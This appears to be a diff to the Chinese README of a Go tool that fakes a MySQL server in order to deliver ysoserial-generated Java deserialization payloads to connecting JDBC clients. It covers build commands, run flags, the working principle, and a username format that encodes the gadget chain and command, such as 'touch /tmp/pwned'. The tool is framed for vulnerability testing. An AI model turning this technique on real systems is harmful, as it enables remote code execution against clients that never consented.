@@ -4,11 +4,13 @@
 
 ## 功能说明
 
-本工具模拟 MySQL 服务器行为，当客户端通过JDBC连接时，可以返回通过 ysoserial 或 ysuserial 生成的反序列化 payload，用于测试目标系统的反序列化漏洞。
+本工具模拟 MySQL 服务器行为，当客户端通过JDBC连接时，可以返回通过 ysoserial 或 ysuserial 生成的反序列化
+payload，用于测试目标系统的反序列化漏洞。
 
 ## 编译
 
 ### Linux
+
 ```bash
 GOOS=linux GOARCH=amd64 go build -o faker-mysql-server-linux-amd64 main.go
 GOOS=linux GOARCH=386 go build -o faker-mysql-server-linux-386 main.go
@@ -16,6 +18,7 @@ GOOS=linux GOARCH=arm64 go build -o faker-mysql-server-linux-arm64 main.go
 ```
 
 ### Windows
+
 ```bash
 build.bat
 ```
@@ -26,37 +29,25 @@ build.bat
 
 ```bash
 ./faker-mysql-server-linux-amd64 -p 3306 -java java -ysoserial /root/ysoserial-0.0.6-SNAPSHOT-all.jar -ysuserial /root/ysuserial-1.5-su18-all.jar
+
+# 指定LDAPDeserialize-tool.jar路径 payload 跟 yso 兼容
+./faker-mysql-server-linux-amd64 -p 6666 -ysoserial .\LDAPDeserialize-tool.jar 
 ```
 
 参数说明：
+
 - `-p`: 监听端口，默认 3306
 - `-java`: Java 可执行文件路径，默认使用 JAVA_HOME 路径
-- `-ysoserial`: ysoserial.jar 文件路径
+- `-ysoserial`: ysoserial.jar 文件路径(可指定LDAPDeserialize-tool.jar路径 payload 跟 yso 兼容)
 - `-ysuserial`: ysuserial.jar 文件路径
-
-### 使用示例
-
-#### 基础用法
-```bash
-# 使用 ysoserial payload
-mysql -h 192.168.1.100 -u yso_CommonsCollections5_calc -p
-
-# 使用 ysuserial payload
-mysql -h 192.168.1.100 -u ysu_CommonsCollections5_calc -p
-```
-
-连接后执行：
-```sql
-SHOW SESSION STATUS;
-```
 
 #### URL 编码用法（支持特殊字符和空格）
 
 当命令中包含空格或特殊字符时，需要对 username 进行 URL 编码：
 
-| 命令 | URL 编码后的 username |
-|------|---------------------|
-| `calc` | `yso_CommonsCollections5_calc` |
+| 命令                 | URL 编码后的 username                            |
+|--------------------|----------------------------------------------|
+| `calc`             | `yso_CommonsCollections5_calc`               |
 | `touch /tmp/pwned` | `yso_CommonsCollections5_touch%20/tmp/pwned` |
 
 ## 工作原理
@@ -67,9 +58,9 @@ SHOW SESSION STATUS;
 4. **对用户名进行 URL 解码**，支持特殊字符和空格
 5. 解析用户名前缀判断使用的 payload 类型（yso/ysu）
 6. 当客户端执行 `SHOW SESSION STATUS` 查询时：
-   - 解析用户名获取 gadget 类型和命令
-   - 调用 ysoserial/ysuserial 生成反序列化 payload
-   - 将 payload 包装在查询结果中返回
+    - 解析用户名获取 gadget 类型和命令
+    - 调用 ysoserial/ysuserial 生成反序列化 payload
+    - 将 payload 包装在查询结果中返回
 
 ### username 格式
 
@@ -96,6 +87,7 @@ SHOW SESSION STATUS;
 ## 更新日志
 
 ### v0.4 (2025-12-31)
+
 - ✨ 新增 username URL 解码功能，支持在 payload 命令中使用特殊字符和空格
 - 🔧 新增 `port` 参数，可以自定义端口
 - ⬆️ Go 版本要求升级到 1.20
